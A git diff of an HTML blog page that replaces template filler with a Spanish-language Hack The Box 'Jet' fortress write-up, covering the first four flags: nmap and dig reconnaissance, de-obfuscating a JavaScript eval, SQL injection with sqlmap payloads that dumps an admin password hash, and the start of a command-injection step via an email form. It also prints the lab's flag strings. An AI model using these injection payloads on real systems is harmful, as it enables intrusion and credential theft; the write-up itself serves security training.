@@ -10,7 +10,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
 <title>Jet - Writeup S0b3k</title>
-<link rel="shortcut icon" type="image/png" sizes="64x64" href="../images/HTB/LogForgeIcon.png">
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="../images/HTB/Jet/Jetcom_logo.png">
 <!--
 
 Machine LogForge
@@ -60,14 +60,14 @@ Machine LogForge
 
 <!-- Home Section -->
 
-<section id="home" class="main-post-logforge parallax-section">
+<section id="home" class="main-post-jet parallax-section" style="height: 360px;">
      <div class="overlay"></div>
      <div id="particles-js"></div>
      <div class="container">
           <div class="row">
 
                <div class="col-md-12 col-sm-12">
-                    <h1>LogForge</h1>
+                    <h1>JET.com</h1>
                </div>
 
           </div>
@@ -79,55 +79,207 @@ Machine LogForge
 <section id="blog-single-post">
      <div class="container">
           <div class="row">
-
                <div class="col-md-offset-1 col-md-10 col-sm-12">
                     <div class="blog-single-post-thumb">
-                         
-
                          <div class="blog-post-title">
-                              <h3><a href="HTB/logforge.html">LogForge | Hack The Box</a></h3>
+                              <h3><a href="#">Jet | Hack The Box</a></h3>
                          </div>
                          <div class="blog-post-format">
-                              <span><a href="#"><img src="../images/HTB/LogForgeIcon.png" class="img-responsive img-circle"> OS Linux</a></span>
-                              <span><i class="fa fa-date"></i>December 23, 2021</span>
-                              <span><a href="#"><i class="fa-solid fa-fire"></i> Medium</a></span>
+                              <span><a href="#"><img src="../images/HTB/Jet/Jetcom_logo.png" class="img-responsive "> OS Linux</a></span>
+                              <span><i class="fa fa-date"></i>April, 2018</span>
+                              <span><a href="#"><i class="fa-solid fa-fire"></i> Fortress</a></span>
                          </div>
-
                          <div class="blog-post-des">
-                              <p>LogForge es una maquina de HackTheBox basando su nombre en la tecnica de Log4Shell, vulnerabilidad de la biblioteca log4j de Java. Este ataque implica vulnerar el servicio web Apache Tomcat para obtener acceso al gestor como Administrador, partiendo de este ataque obtendremos una Shell Reversa como usuario, concatenado a esto tenemos un servicio interno de FTP que se ejecuta como Root, este servicio FTP al igual que tomcat esta basado en Java de manera que siguiendo el concepto de Log4j y apuntando a las .venv (Variables de Entorno) de Java obtendremos las credenciales de acceso como Root.</p>
-                              <blockquote>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. </blockquote>
-                              <p>Integer vestibulum vitae arcu vel consectetur. Morbi nisl enim, elementum eget enim nec, posuere commodo mi. Proin elementum metus et dolor posuere placerat. Proin in sagittis justo. Nulla tincidunt eu velit elementum accumsan.</p>
-                              
-                              <div class="blog-post-image">
-                              <img src="../images/blog-image3.jpg" class="img-responsive" alt="Blog Image 3">
+                              <p>Jet.com es una empresa que esta desarrollando una nueva metodologia para el comercio electronico, ha colaborado con Hack The Box ofreciendonos una cantidad interesante de vulnerabilidades que ayudaran mucho a tener una vision mas empresarial de las pruebas de penetracion incorporando algunas flags que nos iran indicando cuando hemos pwneado cierta vulnerabilidad expuesta.</p>
                          </div>
-                         
-                              <h3>What is Personal Blog Theme?</h3>
-                              <p>Nulla tincidunt eu velit elementum accumsan. Vivamus euismod tempor interdum. Vivamus non scelerisque ex, et interdum leo. In bibendum lacus vitae felis egestas, at consectetur metus facilisis. Morbi tellus dolor, porta dignissim enim sit amet, dapibus sagittis erat. In blandit elit sit amet dui aliquet congue nec vel quam. Integer id tristique libero.</p>
-                         </div>
-                         
-                         
 
-                         <div class="blog-single-post-image">
-                              <div class="col-md-4 col-sm-4">
-                                   <img src="../images/blog-image1.jpg" class="img-responsive" alt="Blog Image 1">
-                              </div>
-                              <div class="col-md-4 col-sm-4">
-                                   <img src="../images/blog-image2.jpg" class="img-responsive" alt="Blog Image 2">
-                              </div>
-                              <div class="col-md-4 col-sm-4">
-                                   <img src="../images/blog-image3.jpg" class="img-responsive" alt="Blog Image 3">
-                              </div>
-                         </div>
-                         <p>Aliquam blandit velit nisi, sed fringilla felis lacinia sed. Integer vitae porta felis. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Phasellus non tristique lacus. Suspendisse ut tortor vitae risus lacinia tristique. Aliquam sed consectetur libero.</p>
+                         <!--First Flag-->
+                         <h3 style="color: #dacece;">Flag 1: Connect</h3>
+                         <p>La primera flag se consigue bajo la instruccion de conectar, primero verificamos si tenemos conexión e indirectamente conocemos el sistema operativo <a class="code">[ttl=64 - Linux]</a> bajo el cual se encuentra el servidor.</p>
+                         <pre class="pre-code"><a class="command">> ping</a> 10.13.37.10
+10.13.37.10 (10.13.37.10) 56(84) bytes of data.
+64 bytes from 10.13.37.10: icmp_seq=1 ttl=63 time=81.1 ms
+64 bytes from 10.13.37.10: icmp_seq=2 ttl=63 time=81.9 ms
+64 bytes from 10.13.37.10: icmp_seq=3 ttl=63 time=81.1 ms
+64 bytes from 10.13.37.10: icmp_seq=4 ttl=63 time=80.8 ms
+--- 10.13.37.10 ping statistics ---
+
+4 packets transmitted, 4 received, 0% packet loss, time 3005ms
+rtt min/avg/max/mdev = 80.776/81.225/81.910/0.418 ms</pre>
+                         <p>Seguido a ello revisamos los servicios disponibles con <a class="code">nmap</a></p>
+                         <pre class="pre-code"><a class="command">> nmap</a> -p- --open -sS -T5 -n -Pn -oN JetPorts.nmap 10.13.37.10
+Nmap scan report for 10.13.37.10
+Host is up (0.089s latency).
+Not shown: 65529 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+53/tcp   open  domain
+80/tcp   open  http
+5555/tcp open  freeciv
+7777/tcp open  cbt
+9201/tcp open  wap-wsp-wtp</pre>
+                         <p>Como servicio mas llamativo accederemos primero al puerto 80 http a traves del navegador, ecnontrandonos con la primera flag: <a class="code">JET{s4n1ty_ch3ck}</a></p>
+                         <span>
+                              <img src="../images/HTB/Jet/http80.png"/>
+                         </span>
+                         <!--End First flag-->
+
+                         <!--Second Flag-->
+                         <h3 style="color: #dacece;">Flag 2: Digging in...</h3>
+                         <p>Para la segunda flag el nombre es una pista, basandonos en el escaneo de <a class="code">Nmap</a> anterior, encontramos el servicio de dominio abierto en el puerto 53, usaremos la herramienta <a class="code">dig</a> para descubrir otros dominios asociados al servidor encontrando <a class="code">www.securewebinc.jet</a></p>
+                         <pre class="pre-code"><a class="command">> dig</a> @10.13.37.10 -x 10.13.37.10
+; <<>> DiG 9.16.33-Debian <<>> @10.13.37.10 -x 10.13.37.10
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+
+;; AUTHORITY SECTION:
+37.13.10.in-addr.arpa.    604800    IN    SOA    www.securewebinc.jet. securewebinc.jet. 3 604800 86400 2419200 604800</pre>
+
+                         <p>Agregamos el dominio a <a class="code">/etc/hosts</a> y accedemos a la web encontrado la flag <a class="code">JET{w3lc0me_4nd_h@v3_fun!}</a>.</p>
+                         <span>
+                              <img src="../images/HTB/Jet/second_flag.png"/>
+                         </span>
+                         <!--End Second flag-->
+
+                         <!--Third Flag-->
+                         <h3 style="color: #dacece;">Flag 3: Going Deeper</h3>
+                         <p>En la tercera flag tenemos el mismo caso, el nombre nos indica buscar mas profundo asi que revisaremos el codigo fuente de la pagina que acabamos de descubrir.</p>
+                         <p>Entre el codigo fuente, siempre resaltan los scripts JS personalizados (custom), dentro de estos, el mas llamativo es <a class="code">secure.js</a></p>
+                         <pre class="pre-code">
+<a class="a-green">&lt;!-- Custom scripts for this template--&gt;</a>
+&lt;<a class="a-red">script</a> src="<u class="a-blue">js/template.js</u>"&gt;&lt;&#47;<a class="a-red">script</a>&gt;
+&lt;<a class="a-red">script</a> src="<u class="a-blue">js/secure.js</u>"&gt;&lt;&#47;<a class="a-red">script</a>&gt;</pre>     
+                         <p><br>En este script encontramos un eval de JS</p>
+                         <pre class="pre-code"> eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,103,101,116,83,116,97,116,115,40,41,10,123,10,32,32,32,32,36,46,97,106,97,120,40,123,117,114,108,58,32,34,47,100,105,114,98,95,115,97,102,101,95,100,105,114,95,114,102,57,69,109,99,69,73,120,47,97,100,109,105,110,47,115,116,97,116,115,46,112,104,112,34,44,10,10,32,32,32,32,32,32,32,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,36,40,39,35,97,116,116,97,99,107,115,39,41,46,104,116,109,108,40,114,101,115,117,108,116,41,10,32,32,32,32,125,44,10,32,32,32,32,101,114,114,111,114,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,32,99,111,110,115,111,108,101,46,108,111,103,40,114,101,115,117,108,116,41,59,10,32,32,32,32,125,125,41,59,10,125,10,103,101,116,83,116,97,116,115,40,41,59,10,115,101,116,73,110,116,101,114,118,97,108,40,102,117,110,99,116,105,111,110,40,41,123,32,103,101,116,83,116,97,116,115,40,41,59,32,125,44,32,49,48,48,48,48,41,59));</pre>
+                         <p><br>Para obtener el codigo usare la herramienta <a class="toolref" href="https://lelinhtinh.github.io/de4js/">de4js</a> encontrando el path de url <a class="code">/dirb_safe_dir_rf9EmcEIx/admin/stats.php</a></p>
+                         <span>
+                              <img src="../images/HTB/Jet/deofuscate_eval.png"/>
+                         </span>
+                         <p><br>Accediendo a la URL no encontramos nada interesante.</p>
+                         <span>
+                              <img src="../images/HTB/Jet/stats.png"/>
+                         </span>
+                         <p><br>Sin embargo, si quitamos el archivo final <a class="code">stats.php</a> la pagina hace un redirect a <a class="code">index.php</a></p>
+                         <span>
+                              <img src="../images/HTB/Jet/index.png"/>
+                         </span>
+                         <p><br>Y en su codigo fuente la flag <a class="code">JET{s3cur3_js_w4s_not_s0_s3cur3_4ft3r4ll}</a></p>
+                         <span>
+                              <img src="../images/HTB/Jet/flag-3.png"/>
+                         </span>
+                         <!--End Third flag-->
+
+                         <!--Fourth Flag-->
+                         <h3 style="color: #dacece;">Flag 4: Bypassing Authentication</h3>
+                         <p>La instrucción de la cuarta flag nos indica que deberemos bypassear la autenticación para obtener la flag, comencé interceptando la petición del login con <a class="code">Burpsuite</a>, y ya que la petición se encontraba en texto plano realicé prubeas de SQLi sin resultados positivos.</p>
+                         <span>
+                              <img src="../images/HTB/Jet/dologin.png"/>
+                         </span>
+                         <p><br>Continuando con el SQLi ejecute la herramienta automatizada <a class="code">sqlmap</a> con la solicitud almacenada la cual si dió resultados, logrando enumerar las bases de datos alojadas.</p>
+                         <span>
+                              <pre class="pre-code"><a class="command">> cat</a> dologin
+────┬───────────────────────────────────────────────────────────────────────────────────────────────
+    │ File: dologin
+────┼───────────────────────────────────────────────────────────────────────────────────────────────
+  1 │ POST /dirb_safe_dir_rf9EmcEIx/admin/dologin.php HTTP/1.1
+  2 │ Host: www.securewebinc.jet
+  3 │ User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
+  4 │ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+  5 │ Accept-Language: en-US,en;q=0.5
+  6 │ Accept-Encoding: gzip, deflate
+  7 │ Referer: http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php
+  8 │ Content-Type: application/x-www-form-urlencoded
+  9 │ Content-Length: 29
+ 10 │ Origin: http://www.securewebinc.jet
+ 11 │ DNT: 1
+ 12 │ Connection: close
+ 13 │ Cookie: PHPSESSID=h40pauadc0vsru3ujdmq61mri3
+ 14 │ Upgrade-Insecure-Requests: 1
+ 15 │ 
+ 16 │ username=admin&password=admin
+────┴────────────────────────────────────────────────────────────────────────────────────────────────</pre>
+                         </span>
+                         <br><br>
+                         
+                         <pre class="pre-code"><a class="command">> sqlmap</a> -r dologin -dbs
+[INFO] parsing HTTP request from 'dologin'
+---
+Parameter: username (POST)
+     Type: error-based
+     Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+     Payload: username=admin' AND (SELECT 6669 FROM(SELECT COUNT(*),CONCAT(0x7178707871,(SELECT (ELT(6669=6669,1))),0x717a787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS 
+              GROUP BY x)a)-- ZeSF&password=admin
+     
+     Type: time-based blind
+     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+     Payload: username=admin' AND (SELECT 6821 FROM (SELECT(SLEEP(5)))onXD)-- Gqji&password=admin
+---
+[INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.10.3
+back-end DBMS: MySQL >= 5.0
+[INFO] fetching database names
+available databases [2]:
+[*] information_schema
+[*] jetadmin</pre>
+                         <p><br>Procedi a dumpear la base de datos <a class="code">jetadmin</a> obteniendo un hash del usuario admin.</p>
+                         <pre class="pre-code"><a class="command">> sqlmap</a> -r dologin -D jetadmin --dump
+[WARNING] no clear password(s) found
+Database: jetadmin
+Table: users
+[1 entry]
++----+------------------------------------------------------------------+----------+
+| id | password                                                         | username |
++----+------------------------------------------------------------------+----------+
+| 1  | 97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084 | admin    |
++----+------------------------------------------------------------------+----------+</pre>
+
+                         <p>Con el hash encontrado use la herramienta <a class="toolref" href="https://crackstation.net/">Crackstation</a> para romper este mismo, obteniendo la contraseña del usuario admin.
+                         <span>
+                              <img src="../images/HTB/Jet/crackstation.png"/>
+                         </span>
+                         <p><br>Iniciando sesion con las credenciales obtenidas obtuve la flag <a class="code">JET{sQl_1nj3ct1ons_4r3_fun!}</a>.</p>
+                         <span>
+                              <img src="../images/HTB/Jet/flag-4.png"/>
+                         </span>
+                         <!--End Fourth flag-->
+
+                         <!--Start Fifth flag-->
+                         <h3 style="color: #dacece;">Flag 5: Command</h3>
+                         <p> Para la quinta flag la instruccion es <a class="code">command</a> y se basa en una vulnerabilidad de <a class="code">[RCE] Remote Command Execution.</a><br> Partiendo con esta idea, revise que existe un apartado de Quick Email, procedi a comprobar el funcionamiento y lógica de la trama interceptada  
+                         </p>
+                         <span>
+                              <img src="../images/HTB/Jet/quick_email.png"/>
+                         </span>
+                         <p><br></p>
+                         <span>
+                              <img src="../images/HTB/Jet/mail_intercept.png"/>
+                         </span>
+                         <br>
+                         <p>
+                              URL decodeando el contenido de la trama vemos lo siguiente. 
+                         <pre class="pre-code">
+<a class="a-blue">swearwords</a>[<a class="a-red">/fuck/i</a>]=<a class="a-green">make love</a>&
+<a class="a-blue">swearwords</a>[<a class="a-red">/shit/i</a>]=<a class="a-green">poop</a>&
+<a class="a-blue">swearwords</a>[<a class="a-red">/ass/i</a>]=<a class="a-green">behind</a>&
+<a class="a-blue">swearwords</a>[<a class="a-red">/dick/i</a>]=<a class="a-green">penis</a>&
+<a class="a-blue">swearwords</a>[<a class="a-red">/whore/i</a>]=<a class="a-green">escort</a>&
+<a class="a-blue">swearwords</a>[<a class="a-red">/asshole/i</a>]=<a class="a-green">bad person</a>&
+<a class="a-blue">to</a>=<a class="a-green">s0bek@mailtest.com</a>&
+<a class="a-blue">subject</a>=<a class="a-green">Subject_s0b3k</a>&
+<a class="a-blue">message</a>=<a class="a-green">&lt;p>s0b3k_message&lt;br>&lt;/p></a>&
+<a class="a-blue">_wysihtml5_mode</a>=1</pre>
+                         </p>
+                         <!--End Fifth flag-->
 
                          <div class="blog-author">
                               <div class="media">
                                    <div class="media-object pull-left">
-                                        <img src="../images/author-image1.jpg" class="img-circle img-responsive" alt="blog">
+                                        <img src="../images/perfil.jpeg" class="img-circle img-responsive" alt="blog">
                                    </div>
                                    <div class="media-body">
-                                        <h3 class="media-heading"><a href="#">Jen Lopez ( Designer )</a></h3>
+                                        <h3 class="media-heading"><a href="#">S0b3k [Author]</a></h3>
                                         <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip.</p>
                                    </div>
                               </div>
